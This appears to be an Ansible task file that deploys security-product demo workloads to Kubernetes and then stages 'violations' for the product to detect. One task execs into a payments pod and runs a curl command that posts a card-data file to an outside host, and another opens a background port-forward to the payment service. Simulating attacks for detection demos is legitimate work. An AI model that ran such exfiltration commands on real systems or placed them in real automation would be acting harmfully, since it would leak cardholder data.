- name: Get demos
  find:
    paths:
      - roles/acs-demo/files/demos
    recurse: yes
    patterns: '*.yaml'
  register: demo_yamls

# - name: Remove any existing
#   kubernetes.core.k8s:
#     state: absent
#     definition: "{{ lookup('file', item.path ) | from_yaml_all }}"
#   # shell: "{{ orchestrator_tool }} apply --request-timeout=90s -R -f {{ item }}"
#   environment:
#     KUBECONFIG: "{{ kubeconfig }}"
#   loop: "{{ demo_yamls.files }}"

- name: Apply demos
  kubernetes.core.k8s:
    state: present
    definition: "{{ lookup('file', item.path ) | from_yaml_all }}"
  # shell: "{{ orchestrator_tool }} apply --request-timeout=90s -R -f {{ item }}"
    #kubeconfig: "{{ kubeconfig }}"
  loop: "{{ demo_yamls.files }}"

- name: Wait before restarting problematic pods
  pause:
    minutes: 1

- name: Restart problematic pods
  # These pods sometimes come up in a failed state.  Restarting them seems to resolve the issue.
  shell: "{{ orchestrator_tool }} delete po --namespace={{ item.namespace }} --selector \"{{ item.selector }}\""
  #environment:
  #  KUBECONFIG: "{{ kubeconfig }}"
  retries: 3
  delay: 10
  register: result
  until: result.rc == 0
  loop:
    - { namespace: 'payments', selector: 'app=mastercard-processor'}
    - { namespace: 'backend', selector: 'app=backend-atlas'}


- name: Wait for demos to start.
  shell: "{{ orchestrator_tool }} wait --namespace={{ item.namespace }} --for=condition=Ready pods --selector \"{{ item.selector }}\" --timeout=30s"
  #environment:
  #  KUBECONFIG: "{{ kubeconfig }}"
  retries: 3
  delay: 10
  register: result
  until: result.rc == 0
  loop:
    - { namespace: 'payments', selector: 'app=visa-processor'}
    - { namespace: 'backend', selector: 'app=backend-atlas'}
    - { namespace: 'frontend', selector: 'app=asset-cache'}

- name: k8s_exec violation
  kubernetes.core.k8s_exec:
    namespace: payments
    #pod: "{{ lookup('kubernetes.core.k8s', kind='Pod', namespace='payments', label_selector='app=mastercard-processor', kubeconfig=kubeconfig).metadata.name }}"
    pod: "{{ lookup('kubernetes.core.k8s', kind='Pod', namespace='payments', label_selector='app=mastercard-processor').metadata.name }}"
    #kubeconfig: "{{ kubeconfig }}"
    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
    #command: '/bin/ls'
    validate_certs: no
  ignore_errors: True
  tags:
    - k8s_violations

- name: k8s_portforward violation
  shell: "{{ orchestrator_tool }} -n payments port-forward service/mastercard-processor-service 30000:8080 1>/dev/null 2>&1 &"
  tags:
    - k8s_violations


